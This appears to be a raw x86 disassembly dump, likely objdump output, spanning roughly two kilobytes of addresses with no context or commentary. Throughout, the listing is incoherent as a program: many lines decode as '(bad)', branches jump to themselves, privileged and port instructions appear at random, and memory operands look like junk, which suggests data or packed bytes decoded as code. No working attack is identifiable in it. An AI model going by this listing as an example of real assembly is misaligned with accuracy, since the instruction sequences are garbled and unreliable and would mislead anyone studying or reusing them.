  43361f:	mov    eax,DWORD PTR [ebx]
  433621:	lock push ebp
  433623:	ror    DWORD PTR [ebp-0x2972feb3],1
  433629:	or     bh,dl
  43362b:	jb     0x43362b
  43362d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  433633:	loopne 0x433635
  433635:	jne    0x433635
  433637:	data16 add BYTE PTR [esi+eiz*2],dh
  43363b:	mov    ecx,ebx
  43363d:	data16 cmp cl,dh
  433640:	add    BYTE PTR [eax],bh
  433642:	data16 add bl,cl
  433645:	data16 cmp dh,dl
  433648:	add    BYTE PTR [edx],bh
  43364a:	data16 add bl,cl
  43364d:	enterw 0x4df1,0x19
  433652:	pop    edi
  433653:	jne    0x4335d6
  433655:	mov    esi,DWORD PTR [edi]
  433657:	call   0x77b7c1f8
  43365c:	xor    ebp,DWORD PTR [ebx]
  43365e:	lea    esp,[esi+0x48]
  433661:	repnz in eax,0x3b
  433664:	add    BYTE PTR [ebp-0x37],dh
  433667:	xor    edx,DWORD PTR [ebp-0x15]
  43366a:	in     al,dx
  43366b:	xor    edx,DWORD PTR [esi+0x40]
  43366e:	mov    DWORD PTR [edi],0x338545fc
  433674:	clc    
  433675:	add    esi,DWORD PTR [esi]
  433677:	pop    edi
  433678:	pushf  
  433679:	pop    ebx
  43367a:	call   0xff443641
  43367f:	mov    edi,eax
  433681:	push   ecx
  433682:	pop    es
  433683:	mov    edi,DWORD PTR [edx]
  433685:	push   esi
  433686:	inc    esp
  433687:	(bad)  
  433688:	jle    0x43368a
  43368a:	popa   
  43368b:	data16 (bad) 
  43368d:	into   
  43368e:	addr16 cmp ch,cl
  433691:	add    BYTE PTR [ecx+0x7ce0866],bh
  433697:	cmp    ah,BYTE PTR [esi+0x0]
  43369a:	add    bh,al
  43369c:	(bad)  
  43369d:	cld    
  43369e:	add    BYTE PTR [ebp+0x36c3f866],al
  4336a4:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  4336ab:	pop    ebp
  4336ac:	or     BYTE PTR [edi+0x0],dl
  4336af:	mov    bh,0x66
  4336b1:	mov    edi,0xff038dc3
  4336b6:	jne    0x433709
  4336b8:	lea    edx,[ecx+0x1]
  4336bb:	mov    ebx,0xd64ff1
  4336c0:	sar    DWORD PTR [ebx],1
  4336c2:	test   BYTE PTR [ebp+0x32],dh
  4336c5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4336c9:	push   edi
  4336ca:	xor    BYTE PTR [ebx],0x3a
  4336cd:	mov    esi,ebx
  4336cf:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4336d5:	xor    al,BYTE PTR [ebp+0x64]
  4336d8:	pop    ebx
  4336d9:	mov    ebx,0x9c3a37
  4336de:	je     0x43370b
  4336e0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4336e6:	mov    WORD PTR [ebx],?
  4336e8:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  4336ee:	pop    edi
  4336ef:	cmp    ecx,ecx
  4336f1:	jne    0x433748
  4336f3:	mov    ebp,esp
  4336f5:	cld    
  4336f6:	push   esi
  4336f7:	pop    ebx
  4336f8:	inc    ebp
  4336f9:	stc    
  4336fa:	aaa    
  4336fb:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433702:	clc    
  433703:	test   dl,dl
  433705:	xor    al,0xff
  433707:	fs pop si
  43370a:	or     bl,al
  43370c:	dec    BYTE PTR [ebx+0x57665100]
  433712:	retf   0x3845
  433715:	aaa    
  433716:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43371d:	clc    
  43371e:	add    BYTE PTR [ebx+0x66],bl
  433721:	dec    edx
  433723:	mov    edx,DWORD PTR [edi-0x76]
  433726:	push   edi
  433727:	add    al,0xb7
  433729:	xor    al,0xba
  43372b:	cmp    al,0x8d
  43372d:	je     0x43372e
  43372f:	mov    edx,DWORD PTR [ecx-0x46]
  433732:	push   ecx
  433733:	lea    edi,[ebx+0x514fff]
  433739:	push   ecx
  43373a:	cmp    edx,DWORD PTR [ebx+0x75]
  43373d:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  433743:	add    BYTE PTR [ebx],dh
  433745:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43374b:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  433752:	mov    ebx,0x3b3a00
  433757:	jne    0x433784
  433759:	mov    DWORD PTR [ebx+0x728afc],edi
  43375f:	xor    esi,DWORD PTR [ebx]
  433761:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  433767:	push   edi
  433768:	cmp    esp,ebp
  43376a:	jne    0x43376c
  43376c:	sbb    DWORD PTR [eax],0x8085c3fc
  433772:	clc    
  433773:	inc    esp
  433774:	pop    ebx
  433775:	sti    
  433776:	add    eax,0xeb8bc075
  43377b:	cld    
  43377c:	xor    edi,DWORD PTR ds:0xf8c3855e
  433782:	mov    ecx,DWORD PTR [ecx+edx*2]
  433785:	rol    DWORD PTR [ebp-0x37],0xf
  433789:	mov    DWORD PTR [eax],ecx
  43378b:	inc    edi
  43378c:	(bad)  
  43378d:	in     eax,0x2
  43378f:	add    bh,bh
  433791:	(bad)  
  433792:	mov    esi,0xc38a5e
  433797:	mov    esi,DWORD PTR [ebx]
  433799:	push   ecx
  43379a:	mov    edi,0xfc4fc7
  43379f:	test   DWORD PTR [ebp-0x8],edx
  4337a2:	data16 ss (bad) 
  4337a5:	pushf  
  4337a6:	sub    ebp,eax
  4337a8:	inc    ebp
  4337a9:	(bad)  
  4337aa:	sub    edi,edi
  4337ac:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4337b2:	inc    ebp
  4337b3:	add    BYTE PTR [esi+0x2b],ah
  4337b6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4337bc:	cmp    al,0x33
  4337be:	mov    edi,DWORD PTR [edx+0x24f81]
  4337c4:	(bad)  
  4337c5:	cmp    esi,DWORD PTR [ebx]
  4337c7:	je     0x433781
  4337c9:	push   ebx
  4337ca:	dec    edi
  4337cb:	str    ecx
  4337ce:	cmp    esp,DWORD PTR [edi+0x75]
  4337d1:	int    0x33
  4337d3:	mov    edi,0x789085f
  4337d8:	mov    ecx,DWORD PTR [eax]
  4337da:	cld    
  4337db:	add    cl,cl
  4337dd:	data16 add al,0xcb
  4337e0:	push   ebp
  4337e1:	add    ebp,esp
  4337e3:	jne    0x4337d1
  4337e5:	(bad)  
  4337e6:	mov    DWORD PTR [ecx],0xd685f7ec
  4337ec:	clc    
  4337ed:	xlat   BYTE PTR ds:[ebx]
  4337ee:	inc    ebp
  4337ef:	mov    edi,DWORD PTR [ecx]
  4337f1:	push   eax
  4337f2:	pushf  
  4337f3:	in     eax,0x8b
  4337f5:	add    ah,ch
  4337f7:	(bad)  
  4337f8:	push   ecx
  4337f9:	add    BYTE PTR [ecx+0x66],dl
  4337fc:	add    eax,0x3872cb
  433801:	add    BYTE PTR [ebp+0x66],al
  433804:	(bad)  
  433805:	retf   
  433806:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43380d:	retf   
  43380e:	cmp    cl,al
  433810:	pushf  
  433811:	jge    0x4337da
  433813:	aaa    
  433814:	cld    
  433815:	pushf  
  433816:	test   DWORD PTR [edi-0x8],ebx
  433819:	je     0x433860
  43381b:	xor    esi,DWORD PTR ds:0x7020840
  433821:	ror    BYTE PTR [ebp-0x37],0x8d
  433825:	push   ebp
  433826:	add    esp,ebp
  433828:	jb     0x4337b5
  43382a:	add    BYTE PTR [eax],cl
  43382c:	dec    ebp
  43382d:	mov    bh,0x81
  43382f:	push   esi
  433830:	push   ecx
  433831:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  433838:	xor    al,BYTE PTR [eax]
  43383a:	mov    edx,DWORD PTR [edi+0x10]
  43383d:	(bad)  
  43383e:	scas   eax,DWORD PTR es:[edi]
  43383f:	cmp    bh,BYTE PTR [ebx]
  433841:	add    BYTE PTR [edi],cl
  433843:	mov    ebp,ebp
  433845:	cld    
  433846:	add    BYTE PTR [ebx],bh
  433848:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43384c:	dec    ebp
  43384d:	or     BYTE PTR [ebx],ch
  43384f:	ret    0x458b
  433852:	lock jmp 0x433846
  433855:	mov    ecx,DWORD PTR [eax]
  433857:	or     BYTE PTR [edi],al
  433859:	mov    ecx,eax
  43385b:	xor    DWORD PTR [edx+0x2],0x0
  43385f:	mov    bh,0xc1
  433861:	adc    BYTE PTR [eax],dh
  433863:	iret   
  433864:	inc    ebp
  433865:	mov    DWORD PTR [ebx],0x4dfff8c5
  43386b:	inc    BYTE PTR [ebx]
  43386d:	cmp    bh,al
  43386f:	add    BYTE PTR [ecx],dl
  433871:	data16 adc al,bh
  433874:	dec    ecx
  433875:	fisttp WORD PTR [ecx+0x456604c0]
  43387b:	add    dh,BYTE PTR ds:0x75e0845
  433881:	ret    0x4d
  433884:	lea    ecx,[ebx+0x18728301]
  43388a:	add    BYTE PTR [ebp+0x45],al
  43388d:	ss jmp 0x10a392f
  433893:	call   0xf8cebddd
  433898:	clc    
  433899:	inc    ebp
  43389a:	shl    DWORD PTR ds:0x781084d,0x51
  4338a1:	cdq    
  4338a2:	push   ecx
  4338a3:	xor    al,BYTE PTR [ecx+0x32f89989]
  4338a9:	inc    ebp
  4338aa:	cmp    edi,DWORD PTR [esi]
  4338ac:	jbe    0x43384a
  4338ae:	mov    eax,edi
  4338b0:	or     ah,dh
  4338b2:	inc    ebp
  4338b3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4338b9:	cmp    BYTE PTR [ebx-0x74747664],cl
  4338bf:	in     al,dx
  4338c0:	hlt    
  4338c1:	push   ecx
  4338c2:	push   ecx
  4338c3:	push   ecx
  4338c4:	push   ecx
  4338c5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4338cb:	cdq    
  4338cc:	cdq    
  4338cd:	xor    dh,BYTE PTR [edx]
  4338cf:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4338d5:	or     BYTE PTR [ebp+0x7],al
  4338d8:	mov    eax,ecx
  4338da:	clc    
  4338db:	jb     0x43389e
  4338dd:	add    BYTE PTR [ebp+0x55],cl
  4338e0:	or     DWORD PTR [edi],0xc251d151
  4338e6:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  4338f0:	mov    edi,eax
  4338f2:	or     cl,al
  4338f4:	inc    ebp
  4338f5:	dec    ebp
  4338f6:	mov    eax,DWORD PTR [ecx+0x514d510c]
  4338fc:	or     WORD PTR [ecx],0x8999
  433901:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433907:	mov    edx,DWORD PTR [ecx+0x8]
  43390a:	mov    eax,DWORD PTR [ebp-0x8]
  43390d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433914:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43391a:	inc    ebp
  43391b:	dec    eax
  43391c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  433922:	add    edx,DWORD PTR [ecx-0x8]
  433925:	mov    ecx,DWORD PTR [ecx]
  433927:	clc    
  433928:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  43392f:	mov    ecx,ebp
  433931:	clc    
  433932:	(bad)  
  433933:	popf   
  433934:	inc    DWORD PTR [eax]
  433936:	ret    0x8b
  433939:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43393f:	mov    edi,esp
  433941:	hlt    
  433942:	test   ecx,esi
  433944:	clc    
  433945:	or     BYTE PTR [ebp+0x7],al
  433948:	cmp    ecx,eax
  43394a:	pushf  
  43394b:	jb     0x433980
  43394d:	add    BYTE PTR [eax-0x3f],al
  433950:	inc    eax
  433951:	daa    
  433952:	inc    ebp
  433953:	inc    ebp
  433954:	xor    eax,0x7f80803
  433959:	dec    ebp
  43395a:	cdq    
  43395b:	add    esi,DWORD PTR [edx]
  43395d:	clc    
  43395e:	cmp    DWORD PTR [ecx],ecx
  433960:	or     al,0x8
  433962:	add    al,BYTE PTR [ebp+0x2c]
  433965:	xor    eax,0x7350845
  43396a:	or     BYTE PTR [ebp+0x7],cl
  43396d:	lea    ebx,[ecx-0x748dcdff]
  433973:	add    BYTE PTR [eax*2-0x74b21438],cl
  43397a:	mov    edx,DWORD PTR [eax]
  43397c:	cld    
  43397d:	dec    ebp
  43397e:	push   ecx
  43397f:	sub    edx,DWORD PTR [ecx-0x75]
  433982:	add    eax,0xf172fc
  433987:	or     BYTE PTR [ebp+0x7],cl
  43398a:	add    eax,ecx
  43398c:	or     al,0x72
  43398e:	add    DWORD PTR [eax],eax
  433990:	mov    ebx,0x29c2c1
  433995:	inc    ebp
  433996:	mov    eax,DWORD PTR [ebx]
  433998:	cmp    eax,0x3004d1c
  43399e:	xbegin 0x66c8c598
  4339a4:	clc    
  4339a5:	or     BYTE PTR [ebp+0x45],al
  4339a8:	cmp    DWORD PTR ds:0x78b089c,esi
  4339ae:	adc    BYTE PTR [ebp+0x45],cl
  4339b1:	lea    eax,[ebp+0x33727501]
  4339b7:	add    cl,ch
  4339b9:	inc    ebp
  4339ba:	add    bl,ch
  4339bc:	add    BYTE PTR [ebx+0x45850845],cl
  4339c2:	je     0x43394f
  4339c4:	push   ebx
  4339c5:	or     al,0x85
  4339c7:	dec    ebp
  4339c8:	std    
  4339c9:	mov    bh,bh
  4339cb:	mov    BYTE PTR [ebp-0x75],al
  4339ce:	mov    edi,eax
  4339d0:	or     al,0x89
  4339d2:	inc    ebp
  4339d3:	clc    
  4339d4:	mov    esp,esp
  4339d6:	hlt    
  4339d7:	call   DWORD PTR [edi-0x37]
  4339da:	push   ecx
  4339db:	or     al,0x51
  4339dd:	push   ebp
  4339de:	xor    ebp,esp
  4339e0:	mov    esi,0x457251
  4339e5:	ss (bad) 
  4339e7:	pushf  
  4339e8:	inc    ebp
  4339e9:	(bad)  
  4339ea:	mov    edi,eax
  4339ec:	or     al,0x85
  4339ee:	add    al,bh
  4339f0:	inc    eax
  4339f2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4339f6:	or     ah,bh
  4339f8:	inc    eax
  4339f9:	push   ecx
  4339fa:	jmp    0x433a4d
  4339fc:	mov    eax,DWORD PTR ds:0xe8720c
  433a02:	mov    DWORD PTR [ebp-0x8],eax
  433a05:	jne    0x433a4c
  433a07:	jmp    0x433994
  433a09:	mov    ebp,DWORD PTR [eax]
  433a0b:	clc    
  433a0c:	retf   0xff51
  433a0f:	push   ecx
  433a10:	mov    DWORD PTR ds:0x757210,eax
  433a16:	mov    ecx,DWORD PTR [ebp-0x4]
  433a19:	sub    esp,DWORD PTR [ebx-0x77]
  433a1c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  433a23:	or     ah,bh
  433a25:	pop    es
  433a26:	ds cdq 
  433a28:	push   DWORD PTR [edx]
  433a2a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  433a30:	(bad)  
  433a31:	mov    bh,bh
  433a33:	jmp    0x433a21
  433a35:	leave  
  433a36:	jne    0x433a40
  433a38:	call   0x303392
  433a3d:	in     al,dx
  433a3e:	dec    ebp
  433a3f:	add    dh,BYTE PTR [ebx]
  433a41:	add    BYTE PTR [ebx],al
  433a43:	inc    ebp
  433a44:	cmp    esi,DWORD PTR [esi]
  433a46:	je     0x4339e4
  433a48:	mov    eax,edi
  433a4a:	or     al,0xf0
  433a4c:	add    BYTE PTR [ebp+0x458bf845],al
  433a52:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  433a58:	adc    al,0x7
  433a5a:	enter  0x9fc0,0xa5
  433a5e:	rol    BYTE PTR [eax],0x5e
  433a61:	mov    ecx,ecx
  433a63:	or     al,0xc
  433a65:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  433a6c:	jmp    0x433a6d
  433a6e:	push   ebp
  433a6f:	mov    esp,ebp
  433a71:	cld    
  433a72:	inc    ebp
  433a73:	inc    ebp
  433a74:	or     DWORD PTR [ecx+0x457dec10],0x0
  433a7b:	push   esi
  433a7c:	push   esi
  433a7d:	mov    edi,0x7af080f
  433a82:	add    bh,al
  433a84:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a8a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a90:	mov    ebp,eax
  433a92:	mov    ebp,edi
  433a94:	lock call edx
  433a97:	fcom   DWORD PTR [ebp+0x45]
  433a9a:	mov    eax,0x148a8b
  433a9f:	push   ecx
  433aa0:	enter  0xc145,0x83
  433aa4:	cmp    cl,BYTE PTR [eax]
  433aa6:	add    BYTE PTR [ebp+0x4d],al
  433aa9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433aaf:	call   0xffa3361e
  433ab4:	cmp    eax,DWORD PTR [ebp-0xc]
  433ab7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433abb:	push   ebp
  433abc:	(bad)
  433abf:	std    
  433ac0:	lock push DWORD PTR [edi+0x5d08fcdb]
  433ac7:	inc    ebp
  433ac8:	(bad)  
  433ac9:	call   0xff7d3759
  433ace:	add    al,BYTE PTR [ebp+0x37]
  433ad1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433ad7:	jne    0x433ad9
  433ad9:	(bad)  
  433ada:	cmp    edi,esp
  433adc:	jne    0x433b0f
  433ade:	mov    edi,edi
  433ae0:	or     BYTE PTR [ebx-0x307f0b49],cl
  433ae6:	pop    ds
  433ae7:	into   
  433ae8:	je     0x433aab
  433aea:	mov    ebx,DWORD PTR [esi]
  433aec:	or     BYTE PTR [ebp-0x49],al
  433aef:	mov    esp,DWORD PTR [esi-0x77]
  433af2:	mov    esi,0xfe451f0c
  433af7:	mov    eax,DWORD PTR [eax]
  433af9:	or     al,0x66
  433afb:	sar    bl,0x3b
  433afe:	xor    esi,DWORD PTR [ebp+0x66]
  433b01:	xor    ecx,edi
  433b03:	pop    edi
  433b04:	adc    bl,BYTE PTR [ebx+0x7e]
  433b07:	ret    0xff
  433b0a:	cld    
  433b0b:	inc    ebp
  433b0c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433b12:	cld    
  433b13:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433b1a:	push   0xffffff83
  433b1c:	pop    edi
  433b1d:	or     BYTE PTR [ebp+0x53],dh
  433b20:	xorps  xmm1,xmm2
  433b23:	test   BYTE PTR [eax+eax*1],bh
  433b26:	add    BYTE PTR [eax],al
  433b28:	adc    eax,eax
  433b2a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433b32:	jmp    DWORD PTR [eax]
  433b34:	ror    al,0x5e
  433b37:	inc    ebp
  433b38:	leave  
  433b39:	xor    ecx,DWORD PTR [eax]
  433b3b:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433b41:	add    ch,al
  433b43:	xor    edi,edi
  433b45:	xor    DWORD PTR [ebx],0x660033fe
  433b4b:	mov    DWORD PTR [ebp-0xc],ecx
  433b4e:	pcmpgtw mm0,mm0
  433b51:	add    dl,ah
  433b53:	leave  
  433b54:	mov    edi,DWORD PTR [eax-0x7d]
  433b57:	push   ax
  433b59:	dec    ebp
  433b5a:	mov    esi,DWORD PTR [ebx-0x75]
  433b5d:	lea    ebp,[eax-0x7c00fffe]
  433b63:	xor    eax,DWORD PTR [eax]
  433b65:	sysret 
  433b67:	dec    ebp
  433b68:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433b6f:	push   WORD PTR [ecx+0x8]
  433b73:	jne    0x433b36
  433b75:	ud0    ecx,DWORD PTR [ecx]
  433b78:	mov    edi,DWORD PTR [edx]
  433b7a:	lods   al,BYTE PTR ds:[esi]
  433b7b:	add    BYTE PTR [eax],al
  433b7d:	data16 (bad) 
  433b7f:	iret   
  433b80:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b87:	cli    
  433b88:	inc    ebp
  433b89:	cmp    al,0x8d
  433b8b:	add    BYTE PTR [esi+0x2d],ah
  433b8e:	inc    ebp
  433b8f:	pop    ebp
  433b90:	lea    ecx,[edi]
  433b92:	mov    dl,bh
  433b94:	add    BYTE PTR [edi],cl
  433b96:	mov    DWORD PTR [eax+eax*8],edi
  433b99:	mov    ebx,0x3a87
  433b9e:	add    BYTE PTR [ebx],ch
  433ba0:	inc    ebp
  433ba1:	data16 (bad) 
  433ba3:	clc    
  433ba4:	int3   
  433ba5:	cmp    eax,DWORD PTR [eax]
  433ba7:	je     0x433b32
  433ba9:	push   0xffffffc8
  433bab:	pop    edi
  433bac:	xchg   DWORD PTR [ebp+0x0],eax
  433baf:	data16 add BYTE PTR [ebp+0x45],cl
  433bb3:	lea    cx,[ebp+0x10]
  433bb7:	jb     0x433bb9
  433bb9:	jmp    0x433b44
  433bbb:	call   eax
  433bbd:	clc    
  433bbe:	xchg   DWORD PTR [edi+0x1],edi
  433bc1:	mov    eax,DWORD PTR [eax]
  433bc3:	or     BYTE PTR [ebp-0x49],al
  433bc6:	lea    eax,[eax+0x74003154]
  433bcc:	push   edi
  433bcd:	inc    edx
  433bce:	jge    0x433bcf
  433bd0:	mov    DWORD PTR [edi],ecx
  433bd2:	fdiv   DWORD PTR [edi-0x6]
  433bd5:	inc    DWORD PTR [eax]
  433bd7:	xor    edx,DWORD PTR [eax+0x5f]
  433bda:	xchg   DWORD PTR [ebx+0x1],ebx
  433bdd:	ret    0x0
  433be0:	xor    BYTE PTR [ebp-0x51],cl
  433be3:	cmp    edi,0xf0ff8902
  433be9:	data16 ror al,0x84
  433bed:	rol    BYTE PTR [eax],0x3b
  433bf0:	add    al,dh
  433bf2:	dec    eax
  433bf3:	xchg   esp,eax
  433bf4:	push   ebx
  433bf5:	jmp    0x433b82
  433bf7:	push   ebp
  433bf8:	add    esp,ebp
  433bfa:	add    ebp,esp
  433bfc:	mov    edx,DWORD PTR [edi+0x24]
  433bff:	clc    
  433c00:	dec    esi
  433c01:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433c07:	cmp    BYTE PTR [ebx],al
  433c09:	jne    0x433b94
  433c0b:	xor    esp,eax
  433c0d:	jmp    0x463d90
  433c12:	add    ebp,DWORD PTR [ecx+ecx*4]
  433c15:	jne    0x433c0b
  433c17:	call   0xffcd3971
  433c1c:	clc    
  433c1d:	xchg   edi,eax
  433c1e:	sti    
  433c1f:	add    DWORD PTR [ebx],eax
  433c21:	add    BYTE PTR [ebp+0x47],bl
  433c24:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433c2a:	pop    ebp
  433c2b:	mov    DWORD PTR [esi-0x48],esi
  433c2e:	jmp    0x433c77
  433c30:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433c36:	(bad)  
  433c38:	cmp    al,0x0
  433c3a:	cmp    eax,DWORD PTR [ebp+0x18]
  433c3d:	lea    ebx,[ebp-0x56]
  433c40:	jle    0x433c42
  433c42:	jae    0x433bcd
  433c44:	mov    eax,esp
  433c46:	call   0xb900:0x8b005587
  433c4d:	inc    ebp
  433c4e:	push   ebp
  433c4f:	lea    ecx,[ebp-0x27ff4f12]
  433c55:	mov    eax,edi
  433c57:	int3   
  433c58:	push   ebp
  433c59:	xchg   edi,eax
  433c5b:	add    esp,ebp
  433c5d:	add    BYTE PTR [eax],al
  433c5f:	inc    ebp
  433c60:	add    BYTE PTR [ebp+0x8b3255],cl
  433c66:	cld    
  433c67:	mov    DWORD PTR [edx],edi
  433c69:	aam    0x75
  433c6b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433c71:	mov    DWORD PTR [ebx-0x50],edx
  433c74:	test   BYTE PTR [ebp-0x1],0xe8
  433c78:	mov    eax,DWORD PTR [eax]
  433c7a:	hlt    
  433c7b:	add    al,al
  433c7d:	mov    eax,DWORD PTR ds:0x890045a8
  433c83:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c89:	inc    DWORD PTR [eax*2+0xf75854d]
  433c90:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c96:	call   0x729999d7
  433c9b:	je     0x433cfb
  433c9d:	js     0x433cfe
  433c9f:	lock ret 0x7e
  433ca3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433ca9:	mov    edi,edi
  433cab:	sbb    al,bl
  433cad:	clc    
  433cae:	add    BYTE PTR [ebp-0x73],bh
  433cb1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433cb7:	ror    BYTE PTR [eax],1
  433cb9:	dec    ebp
  433cba:	xchg   ebp,eax
  433cbb:	mov    edi,edi
  433cbd:	in     al,0x8b
  433cbf:	jge    0x433c4a
  433cc1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433cc7:	clc    
  433cc8:	pop    esi
  433cc9:	fist   DWORD PTR [ebp+0x5d398b5d]
  433ccf:	clc    
  433cd0:	add    al,0x6e
  433cd2:	mov    eax,DWORD PTR [ebx]
  433cd4:	mov    BYTE PTR [ebp+0x0],dl
  433cd7:	mov    edx,DWORD PTR [ebx-0x20]
  433cda:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433ce0:	add    eax,0x3b3a73
  433ce5:	adc    al,0x89
  433ce7:	pop    eax
  433ce8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433cec:	ret    0xf08
  433cef:	cmp    al,0x2
  433cf1:	mov    DWORD PTR [edx],edi
  433cf3:	cld    
  433cf4:	add    BYTE PTR [ebp+0x66],dl
  433cf7:	add    eax,ebx
  433cf9:	add    esp,eax
  433cfb:	sub    eax,eax
  433cfd:	or     BYTE PTR [ecx-0x77f474bb],cl
  433d03:	add    BYTE PTR [eax],al
  433d05:	mov    DWORD PTR [ebx-0x24],ebx
  433d08:	push   edi
  433d09:	push   ebp
  433d0a:	clc    
  433d0b:	add    DWORD PTR [esi+0x1b0100],0x45
  433d12:	out    0xff,eax
  433d14:	add    edx,DWORD PTR [eax]
  433d16:	jmp    0x433d00
  433d18:	cmp    ch,0x44
  433d1b:	(bad)  
  433d1c:	jmp    0x40c8c56e
  433d21:	je     0x433cad
  433d23:	mov    eax,DWORD PTR [eax-0x10c78104]
  433d29:	inc    ebp
  433d2a:	add    BYTE PTR [ebx-0x770375],al
  433d30:	add    ah,ch
  433d32:	add    edx,esp
  433d34:	pop    edi
  433d35:	pop    ebp
  433d36:	push   ebp
  433d37:	inc    ebx
  433d38:	in     al,dx
  433d39:	pop    ebp
  433d3a:	in     al,dx
  433d3b:	cmp    edx,DWORD PTR [edi-0x8]
  433d3e:	ss xchg esp,eax
  433d40:	pushf  
  433d41:	pop    ebx
  433d42:	mov    ecx,ecx
  433d44:	call   0x8998844d
  433d49:	in     al,dx
  433d4a:	in     al,0x45
  433d4c:	dec    ebp
  433d4d:	push   esi
  433d4e:	test   DWORD PTR [eax+0xfb010f],esi
  433d54:	add    BYTE PTR [eax+0xc018b],dh
  433d5a:	leave  
  433d5b:	inc    ebp
  433d5c:	test   al,ch
  433d5e:	add    dh,bh
  433d60:	add    bh,bh
  433d62:	dec    ebp
  433d63:	push   cs
  433d64:	mov    DWORD PTR [ecx],eax
  433d66:	hlt    
  433d67:	push   es
  433d68:	dec    ebp
  433d69:	leave  
  433d6a:	mov    DWORD PTR [eax],ecx
  433d6c:	clc    
  433d6d:	cmovge eax,ecx
  433d70:	mov    ecx,0x85c2f0
  433d76:	clc    
  433d77:	pop    DWORD PTR [ebp+0x1]
  433d7a:	push   ebx
  433d7b:	add    BYTE PTR [ebp-0x15],bh
  433d7e:	push   esi
  433d7f:	xor    eax,0x898a45
  433d84:	cld    
  433d85:	inc    BYTE PTR [ebp+0x0]
  433d88:	cmp    BYTE PTR [esi-0x64],ah
  433d8b:	add    DWORD PTR [esi+0x78308c1],edi
  433d91:	add    ah,BYTE PTR [edi-0x49]
  433d94:	int    0xbb
  433d96:	mov    ecx,DWORD PTR [edi+0xc]
  433d99:	add    dh,al
  433d9b:	cmp    ecx,ebx
  433d9d:	jne    0x433d67
  433d9f:	xor    ecx,DWORD PTR [ebp+0x66]
  433da2:	jmp    0xca3da8
  433da7:	add    DWORD PTR [ebp+0x0],eax
  433daa:	mov    eax,ebx
  433dac:	or     al,0x8b
  433dae:	(bad)  
  433daf:	mov    ecx,esi
  433db1:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433db8:	mov    eax,edi
  433dba:	or     BYTE PTR [edx],cl
  433dbc:	shl    cl,cl
  433dbe:	icebp  
  433dbf:	add    BYTE PTR [ebp+0x3a],0x8b
  433dc3:	or     BYTE PTR [edx+eax*2],cl
  433dc6:	(bad)  
  433dc7:	or     cl,dh
  433dc9:	stc    
  433dca:	shl    DWORD PTR [ebp-0x30],0xc6
  433dce:	xor    al,0x0
  433dd0:	inc    ebp
  433dd1:	xchg   BYTE PTR [ebx],al
  433dd3:	add    esp,edi
  433dd5:	add    BYTE PTR [ebp-0x39],cl
  433dd8:	mov    al,bl
  433dda:	test   DWORD PTR [ebx+0x1c348375],ecx
  433de0:	sub    al,0xbf
  433de2:	jmp    0x433d69
  433de4:	mov    edi,eax
  433de6:	lock jge 0x433dda
  433de9:	lea    esi,[edx-0x74bad5fd]
  433def:	mov    ebp,esp
  433df1:	or     cl,dh
  433df3:	leave  
  433df4:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433dfb:	dec    ebp
  433dfc:	dec    ebp
  433dfd:	test   DWORD PTR [ebx],eax
  433dff:	paddb  mm6,mm0
  433e02:	add    DWORD PTR [eax],eax
  433e04:	dec    ebp
  433e05:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433e0b:	mov    esi,DWORD PTR [edx]
  433e0d:	or     al,0x2b
  433e0f:	dec    ebp
  433e10:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433e16:	mov    esp,edx
  433e18:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433e1f:	mov    DWORD PTR [ebx],ebp
